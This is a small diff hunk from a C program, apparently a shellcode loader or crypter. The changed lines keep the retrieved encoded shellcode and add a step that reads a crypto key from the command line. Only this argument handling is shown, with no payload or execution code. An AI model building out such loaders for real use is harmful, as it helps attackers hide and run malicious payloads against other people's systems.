@@ -73,7 +73,11 @@ int main (int argc, char **argv)
 	
 	// Retrieve encoded shellcode
 	int shellcode_size = 0;
-	get_shellcode(argv[1], &shellcode_size);
+	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
+	
+	// Retrieve crypto key
+	int key_length = 0;
+	unsigned char *key = get_key(argv[2], &key_length);
 	
 	
 	
